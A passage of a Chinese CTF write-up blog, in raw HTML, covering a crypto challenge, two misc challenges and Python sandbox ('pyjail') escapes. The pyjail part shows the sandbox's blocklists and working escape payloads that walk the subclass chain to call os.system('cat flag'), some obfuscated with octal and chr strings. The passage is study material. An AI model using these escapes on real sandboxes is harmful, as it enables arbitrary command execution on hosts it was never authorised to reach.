stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">M&#x27;=-M_{1}(mod\ n)，最终，M=-M&#x27;(mod\ n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">−</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">最</span><span class="mord cjk_fallback">终</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord">−</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>第一次爆破，是对</mtext><msub><mi>M</mi><mn>1</mn></msub><msub><mi>M</mi><mn>2</mn></msub><mtext>的差值进行爆破</mtext></mrow><annotation encoding="application/x-tex">第一次爆破，是对M_{1}M_{2}的差值进行爆破</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">第</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">次</span><span class="mord cjk_fallback">爆</span><span class="mord cjk_fallback">破</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">对</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">差</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">爆</span><span class="mord cjk_fallback">破</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>最后，对</mtext><msub><mi>M</mi><mn>1</mn></msub><mtext>进行随机数爆破，得到</mtext></mrow><annotation encoding="application/x-tex">最后，对M_{1}进行随机数爆破，得到</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">最</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">对</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">随</span><span class="mord cjk_fallback">机</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">爆</span><span class="mord cjk_fallback">破</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span></span></span></span></p><p><code>cnss&#123;Half-GCD 1s so u5eful!&#125;</code><br />考点<code>Related Message Attack</code></p><h2 id="permutation"><a class="markdownIt-Anchor" href="#permutation"></a> ⚽ Permutation</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">P = Permutations(<span class="number">256</span>).random_element()</span><br><span class="line"><span class="built_in">print</span>(P**<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>([x^y <span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(hashlib.sha512(<span class="built_in">str</span>(P).encode()).digest(), flag)])</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[37, 12, 147, 180, 109, 42, 193, 61, 114, 167, 89, 229, 47, 30, 139, 226, 238, 200, 152, 210, 201, 103, 236, 130, 53, 16, 132, 39, 64, 29, 99, 36, 8, 4, 124, 58, 145, 54, 211, 223, 242, 146, 234, 43, 143, 235, 173, 231, 62, 115, 121, 9, 131, 102, 255, 49, 217, 24, 17, 212, 21, 117, 163, 172, 28, 68, 233, 25, 166, 67, 137, 136, 122, 207, 196, 222, 106, 128, 108, 156, 74, 220, 33, 83, 120, 45, 76, 170, 104, 133, 78, 254, 57, 191, 183, 181, 253, 123, 112, 134, 96, 44, 240, 195, 6, 82, 216, 7, 192, 111, 189, 190, 71, 98, 70, 218, 127, 251, 155, 256, 159, 19, 151, 252, 113, 116, 59, 160, 239, 92, 148, 202, 169, 248, 129, 203, 187, 27, 23, 153, 13, 162, 144, 51, 38, 10, 41, 107, 81, 186, 177, 164, 204, 20, 161, 157, 52, 224, 119, 14, 228, 72, 250, 69, 140, 101, 214, 205, 174, 77, 118, 232, 86, 176, 219, 91, 215, 60, 158, 197, 194, 221, 2, 94, 87, 88, 245, 80, 154, 5, 165, 40, 79, 150, 26, 126, 15, 3, 105, 175, 48, 50, 55, 206, 237, 90, 149, 184, 243, 31, 65, 11, 182, 84, 18, 199, 141, 85, 225, 142, 66, 185, 178, 179, 125, 93, 247, 75, 208, 171, 97, 246, 227, 46, 1, 34, 209, 110, 56, 22, 32, 135, 168, 244, 230, 95, 138, 73, 249, 100, 35, 63, 213, 241, 198, 188]</span></span><br><span class="line"><span class="string">[218, 197, 209, 36, 168, 67, 208, 21, 66, 22, 197, 141, 81, 24, 174, 245, 184, 56, 60, 64, 228, 224, 33, 91, 234, 61, 68, 241, 222, 169, 216, 172, 219, 43, 39, 37, 249, 11]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>这题其实是原题，<strong>bricsctf-2023-Quals</strong>，可参考小鸡块师傅的<a href="https://tangcuxiaojikuai.xyz/post/97bbcbc9.html">博客-sqrt</a></p><p><a href="https://github.com/C4T-BuT-S4D/bricsctf-2023-stage1/blob/master/tasks/crp/sqrt/solve/5.py">解题脚本</a>，貌似跑不起来……，就此作罢了</p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="尔辈不能究物理"><a class="markdownIt-Anchor" href="#尔辈不能究物理"></a> 🙈 尔辈不能究物理</h2><p><code>doc和docx的区别中较大的区别就是文件格式不同，一个是二进制一个为XML格式</code></p><p>用解压工具打开，<code>word/media</code><br /><img src="https://pic1.zhimg.com/80/v2-8169baae2f6395c06af9a525e9fc72a4_1440w.png" alt="" /><br /><code>W5_w0RD_Bt_M3!&#125;</code></p><p><code>word/embeddings/oleObject21.bIn</code><br /><code>010</code>或者记事本打开，发现<br /><code>cnss&#123;N0bodY_Kn0</code><br />发现两段<code>flag</code>的生成时间都是比赛开始的前一天晚上</p><p><code>flag: cnss&#123;N0bodY_Kn0W5_w0RD_Bt_M3!&#125;</code></p><h2 id="星光下的梦想"><a class="markdownIt-Anchor" href="#星光下的梦想"></a> ✨ 星光下的梦想</h2><p><code>Audacity</code>查看频谱图<br /><img src="https://pic1.zhimg.com/80/v2-be9d26046a732d8fab6ecf82c7e33106_1440w.png" alt="" /><br />有点模糊，但也试出来了<br /><code>CNSS&#123;DR34M~UND3RN347H~5T4R11GH7&#125;</code></p><h2 id="️-jailbreak"><a class="markdownIt-Anchor" href="#️-jailbreak"></a> ⛓️ jailbreak</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">jail-<span class="number">0.</span>py</span><br><span class="line"><span class="comment"># FROM python:3.12.3-alpine</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line">BANNER = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">          .?77777777777777$.            </span></span><br><span class="line"><span class="string">          777..777777777777$+           </span></span><br><span class="line"><span class="string">         .77    7777777777$$$           </span></span><br><span class="line"><span class="string">         .777 .7777777777$$$$           </span></span><br><span class="line"><span class="string">         .7777777777777$$$$$$           </span></span><br><span class="line"><span class="string">         ..........:77$$$$$$$           </span></span><br><span class="line"><span class="string">  .77777777777777777$$$$$$$$$.=======.  </span></span><br><span class="line"><span class="string"> 777777777777777777$$$$$$$$$$.========  </span></span><br><span class="line"><span class="string">7777777777777777$$$$$$$$$$$$$.========= </span></span><br><span class="line"><span class="string">77777777777777$$$$$$$$$$$$$$$.========= </span></span><br><span class="line"><span class="string">777777777777$$$$$$$$$$$$$$$$ :========+.</span></span><br><span class="line"><span class="string">77777777777$$$$$$$$$$$$$$+..=========++~</span></span><br><span class="line"><span class="string">777777777$$..~=====================+++++</span></span><br><span class="line"><span class="string">77777777$~.~~~~=~=================+++++.</span></span><br><span class="line"><span class="string">777777$$$.~~~===================+++++++.</span></span><br><span class="line"><span class="string">77777$$$$.~~==================++++++++: </span></span><br><span class="line"><span class="string"> 7$$$$$$$.==================++++++++++. </span></span><br><span class="line"><span class="string"> .,$$$$$$.================++++++++++~.  </span></span><br><span class="line"><span class="string">         .=========~.........           </span></span><br><span class="line"><span class="string">         .=============++++++           </span></span><br><span class="line"><span class="string">         .===========+++..+++           </span></span><br><span class="line"><span class="string">         .==========+++.  .++           </span></span><br><span class="line"><span class="string">          ,=======++++++,,++,           </span></span><br><span class="line"><span class="string">          ..=====+++++++++=.            </span></span><br><span class="line"><span class="string">                ..~+=...     </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> Filter out more dangerous operations</span></span><br><span class="line">FORBIDDEN = [</span><br><span class="line">    ast.Import,</span><br><span class="line">    ast.ImportFrom,</span><br><span class="line">    ast.ClassDef,</span><br><span class="line">    ast.Assign,</span><br><span class="line">]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">c</span>):</span><br><span class="line">    c = ast.parse(c, mode=<span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ast.walk(c):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(i) <span class="keyword">in</span> FORBIDDEN:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="built_in">print</span>(BANNER)</span><br><span class="line">code = <span class="built_in">input</span>(<span class="string">&quot;Enter base64 encoded code: &quot;</span>)</span><br><span class="line">code = base64.b64decode(code.strip()).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(code) &gt; <span class="number">0x1000</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Code too long&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> check(code):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Forbidden operation detected&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    code = <span class="built_in">compile</span>(code, <span class="string">&#x27;&lt;CNSS&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">    <span class="built_in">exec</span>(code, &#123;<span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;&#125;)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><code>nc 156.238.233.117 47800</code><br />经典<code>exec</code>，无回显</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">基于 AST 的沙箱</span><br><span class="line">ast.Import: 表示一个import语句(import os)</span><br><span class="line">ast.ImportFrom: 表示一个from…import…语句</span><br><span class="line">ast.ClassDef: 表示一个类定义 (class A:)</span><br><span class="line">ast.Assign: 表示一个赋值语句(a=1,a=b)</span><br><span class="line"></span><br><span class="line">compile() 函数是一个内置函数，它可以将源码编译为代码或 AST 对象</span><br><span class="line">编译的源码可以是普通的 Python 代码，也可以是 AST 对象</span><br><span class="line">如果它是一个普通的 Python 代码，那么它必须是一个字符串</span><br><span class="line">如果它是一个 AST 对象，那么它将被编译为一个代码对象</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span> 与 <span class="built_in">exec</span> 的区别再于 <span class="built_in">exec</span> 允许 \n 和 ； 进行换行，而 <span class="built_in">eval</span> 不允许。并且 <span class="built_in">exec</span> 不会将结果输出出来，而 <span class="built_in">eval</span> 会</span><br><span class="line"><span class="built_in">eval</span> 无法直接达到执行多行代码的效果，使用 compile 函数并传入 <span class="built_in">exec</span> 模式就能够实现</span><br><span class="line"></span><br><span class="line">__builtins__：包含当前运行环境中默认的所有函数与类</span><br><span class="line"></span><br><span class="line">它们都可以对命名空间进行限制，这里 &#123;<span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;&#125; 直接将命名空间置空，这样就使得内置的函数都无法使用</span><br></pre></td></tr></table></figure><p>这样无法导入模块</p><p><a href="https://dummykitty.github.io/python/2023/05/29/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86.html#exec-%E5%87%BD%E6%95%B0">https://dummykitty.github.io/python/2023/05/29/python-沙箱逃逸原理.html#exec-函数</a></p><p><a href="https://zhuanlan.zhihu.com/p/578966149">https://zhuanlan.zhihu.com/p/578966149</a></p><p><a href="https://jbnrz.com.cn/index.php/2024/05/19/pyjail/">https://jbnrz.com.cn/index.php/2024/05/19/pyjail/</a></p><p><a href="https://www.viewofthai.link/2023/05/11/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://www.viewofthai.link/2023/05/11/python-沙箱逃逸/</a></p><p><a href="https://xz.aliyun.com/t/12647?time__1311=GqGxuDRiYiwxlrzG7DyGQG8D909mL6o3x#toc-22">https://xz.aliyun.com/t/12647?time__1311=GqGxuDRiYiwxlrzG7DyGQG8D909mL6o3x#toc-22</a><br />学习到了还是通过<code>SSTI</code>的本质原理：继承关系逃逸</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__() <span class="keyword">if</span> i.__name__ == <span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;cat flag&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>CNSS&#123;a7_e4sy_p5_ja1l&#125;</code><br />考点<code>pyjail继承链逃逸</code></p><h2 id="️-jailbreak-again"><a class="markdownIt-Anchor" href="#️-jailbreak-again"></a> ⛓️ jailbreak-again()</h2><p><code>nc 156.238.233.117 47801</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># FROM python:3.12.3-alpine</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line">BANNER = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">          .?77777777777777$.            </span></span><br><span class="line"><span class="string">          777..777777777777$+           </span></span><br><span class="line"><span class="string">         .77    7777777777$$$           </span></span><br><span class="line"><span class="string">         .777 .7777777777$$$$           </span></span><br><span class="line"><span class="string">         .7777777777777$$$$$$           </span></span><br><span class="line"><span class="string">         ..........:77$$$$$$$           </span></span><br><span class="line"><span class="string">  .77777777777777777$$$$$$$$$.=======.  </span></span><br><span class="line"><span class="string"> 777777777777777777$$$$$$$$$$.========  </span></span><br><span class="line"><span class="string">7777777777777777$$$$$$$$$$$$$.========= </span></span><br><span class="line"><span class="string">77777777777777$$$$$$$$$$$$$$$.========= </span></span><br><span class="line"><span class="string">777777777777$$$$$$$$$$$$$$$$ :========+.</span></span><br><span class="line"><span class="string">77777777777$$$$$$$$$$$$$$+..=========++~</span></span><br><span class="line"><span class="string">777777777$$..~=====================+++++</span></span><br><span class="line"><span class="string">77777777$~.~~~~=~=================+++++.</span></span><br><span class="line"><span class="string">777777$$$.~~~===================+++++++.</span></span><br><span class="line"><span class="string">77777$$$$.~~==================++++++++: </span></span><br><span class="line"><span class="string"> 7$$$$$$$.==================++++++++++. </span></span><br><span class="line"><span class="string"> .,$$$$$$.================++++++++++~.  </span></span><br><span class="line"><span class="string">         .=========~.........           </span></span><br><span class="line"><span class="string">         .=============++++++           </span></span><br><span class="line"><span class="string">         .===========+++..+++           </span></span><br><span class="line"><span class="string">         .==========+++.  .++           </span></span><br><span class="line"><span class="string">          ,=======++++++,,++,           </span></span><br><span class="line"><span class="string">          ..=====+++++++++=.            </span></span><br><span class="line"><span class="string">                ..~+=...     </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> Filter out more dangerous operations</span></span><br><span class="line">FORBIDDEN_AST = [</span><br><span class="line">    ast.Import,</span><br><span class="line">    ast.ImportFrom,</span><br><span class="line">    ast.ClassDef,</span><br><span class="line">    ast.Assign,</span><br><span class="line">    ast.Eq,</span><br><span class="line">]</span><br><span class="line">FORBIDDEN_PATTERNS = [<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(c) &gt; <span class="number">1000</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Code too long&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> FORBIDDEN_PATTERNS:</span><br><span class="line">        <span class="keyword">if</span> ch <span class="keyword">in</span> c:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Forbidden character found&#x27;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        c = ast.parse(c, <span class="string">&#x27;&lt;CNSS&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Syntax error&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ast.walk(c):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(i) <span class="keyword">in</span> FORBIDDEN_AST:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Forbidden operation found&#x27;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(BANNER)</span><br><span class="line">code = <span class="built_in">input</span>(<span class="string">&#x27;Enter base64 encoded code: &#x27;</span>)</span><br><span class="line">code = base64.b64decode(code.strip()).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">check(code)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    code = <span class="built_in">compile</span>(code, <span class="string">&#x27;&lt;CNSS&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">    <span class="built_in">exec</span>(code, &#123;<span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;&#125;)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>进阶版多了<code>ast.Eq</code>，顾名思义把我们的<code>==</code>ban了<br />还多了黑名单<code>&quot; ' __ [ ] class global import system</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> ().__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;_wrap_close&quot;</span> <span class="keyword">in</span> x.__name__ ][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">［x［<span class="built_in">str</span>(\<span class="number">137</span>\<span class="number">137</span>\<span class="number">151</span>\<span class="number">156</span>\<span class="number">151</span>\<span class="number">164</span>\<span class="number">137</span>\<span class="number">137</span>)］［<span class="built_in">str</span>(\<span class="number">137</span>\<span class="number">137</span>\<span class="number">147</span>\<span class="number">154</span>\<span class="number">157</span>\<span class="number">142</span>\<span class="number">141</span>\<span class="number">154</span>\<span class="number">163</span>\<span class="number">137</span>\<span class="number">137</span>)］ <span class="keyword">for</span> x <span class="keyword">in</span> ()［<span class="built_in">str</span>(\<span class="number">137</span>\<span class="number">137</span>\<span class="number">143</span>\<span class="number">154</span>\<span class="number">141</span>\<span class="number">163</span>\<span class="number">163</span>\<span class="number">137</span>\<span class="number">137</span>)］［<span class="built_in">str</span>(\<span class="number">137</span>\<span class="number">137</span>\<span class="number">142</span>\<span class="number">141</span>\<span class="number">163</span>\<span class="number">145</span>\<span class="number">137</span>\<span class="number">137</span>)］［<span class="built_in">str</span>(\<span class="number">137</span>\<span class="number">137</span>\<span class="number">163</span>\<span class="number">165</span>\<span class="number">142</span>\<span class="number">143</span>\<span class="number">154</span>\<span class="number">141</span>\<span class="number">163</span>\<span class="number">163</span>\<span class="number">145</span>\<span class="number">163</span>\<span class="number">137</span>\<span class="number">137</span>)］() <span class="keyword">if</span> <span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">119</span>)+<span class="built_in">chr</span>(<span class="number">114</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">112</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">99</span>)<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">111</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">101</span>) <span class="keyword">in</span> x［<span class="built_in">str</span>(\<span class="number">137</span>\<span class="number">137</span>\<span class="number">156</span>\<span class="number">141</span>\<span class="number">155</span>\<span class="number">145</span>\<span class="number">137</span>\<span class="number">137</span>)］］pop(<span class="number">0</span>)(<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">121</span>)<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">116</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">109</span>))(<span class="built_in">chr</span>(<span class="number">99</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">116</span>)+<span class="built_in">chr</span>(<span class="number">32</span>)+<span class="built_in">chr</span>(<span class="number">102</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">103</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[x[<span class="string">&quot;\137\137\151\156\151\164\137\137&quot;</span>][<span class="string">&quot;\137\137\147\154\157\142\141\154\163\137\137&quot;</span>] <span class="keyword">for</span> x <span class="keyword">in</span> ()[<span class="string">&quot;\137\137\143\154\141\163\163\137\137&quot;</span>][<span class="string">&quot;\137\137\142\141\163\145\137\137&quot;</span>][<span class="string">&quot;\137\137\163\165\142\143\154\141\163\163\145\163\137\137&quot;</span>]() <span class="keyword">if</span> <span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">119</span>)+<span class="built_in">chr</span>(<span class="number">114</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">112</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">99</span>)<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">111</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">101</span>) <span class="keyword">in</span> x[<span class="string">&quot;\137\137\156\141\155\145\137\137&quot;</span>]]pop(<span class="number">0</span>)(<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">121</span>)<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">116</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">109</span>))(<span class="built_in">chr</span>(<span class="number">99</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">116</span>)+<span class="built_in">chr</span>(<span class="number">32</span>)+<span class="built_in">chr</span>(<span class="number">102</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">103</span>))</span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/12303">https://xz.aliyun.com/t/12303</a><br /><a href="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">https://www.tr0y.wang/2019/05/06/Python沙箱逃逸经验总结/</a><br /><a href="https://lazzzaro.github.io/2020/05/15/web-SSTI/">https://lazzzaro.github.io/2020/05/15/web-SSTI/</a><br /><a href="https://www.cnblogs.com/mumuhhh/p/17811377.html">https://www.cnblogs.com/mumuhhh/p/17811377.html</a><br /><a href="https://xz.aliyun.com/t/12647">https://xz.aliyun.com/t/12647</a><br />然后，又没时间看了，无后续++</p><h2 id="️-jailbreak-again-and-again"><a class="markdownIt-Anchor" href="#️-jailbreak-again-and-again"></a> ⛓️ jailbreak-again-and-again()</h2><p><code>nc 156.238.233.117 47802</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span 